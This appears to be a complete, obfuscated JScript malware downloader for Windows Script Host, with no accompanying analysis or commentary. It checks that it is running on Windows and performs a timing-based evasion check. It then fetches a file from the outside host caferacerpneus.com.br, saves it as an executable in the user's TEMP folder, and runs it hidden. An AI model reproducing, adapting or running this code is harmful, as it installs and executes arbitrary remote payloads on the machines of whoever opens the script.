var vC = false;
var lV = "CreateObject";
var ZM = function Ci() {return WScript[lV]("WScript.Shell");}(), I0 = 11;
var W = "MSXML2.XMLHTTP";
var pP = 2123213;
var o = 0;
function fe(Ho){ZM["Run"](Ho, o, o);};
function AY(){return "" + W;};
function Y(wF, JW){o = o * 1; return wF - JW;};
function KN(){return lV;};
/*@cc_on
  @if (@_win32 || @_win64)
    vC = true;
  @end
@*/
if (vC)
{
var QQ = "";
function r(){return 22;};
var y = 0; var LP = 0;
function RK()
{
var j = new this["Date"]();
var t = j["getUTCMilliseconds"]();
WScript["Sleep"](r());
var j = new this["Date"]();
var oT = j["getUTCMilliseconds"]();
WScript["Sleep"](r());
var j = new this["Date"]();
var F = j["getUTCMilliseconds"]();
var y = "nS";
y = Y(oT, t);
var LP = "I";
LP = Y(F, oT);
QQ = "open";
return Y(y, LP);
}
var R = false;
var v0 = false;
for (var Cu = o; Cu < r() * 1; Cu++){if (RK() != o){
R = true; 
LP = "31" + 11 * y + LP; 
v0 = true; 
break;
}}
function U() {return ((R == true) && (R == v0)) ? 1 : o;};
if (R && U() && v0){
function NA() {return ZM["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "zl7UrKlQvo6hk.exe";};
 C = AY();
 H = WScript[lV](C);
 var yv = 1;
 while (yv){
try {
H[QQ]("GET", "http://caferacerpneus.com.br/lw2osd", false);
H["send"]();
Ak = "Sleep";
for (;;){WScript[Ak](r() * 11); if (H["readystate"] >= 2 * 2) break;};
yv = o;
} catch(W0){};
}
function S(e) {var K = (1, 2, 3, 4, 5, e); return K;};
We = WScript[KN()]("ADODB.Stream");
C = We;
C[QQ]();
C["type"] = S(1);
C["write"](H["ResponseBody"]);
We["position"] = S(o);
C["Save" + "ToFile"](NA(), 2);
We["c"+"lose"]();
v = NA();
fe(v);
}
}

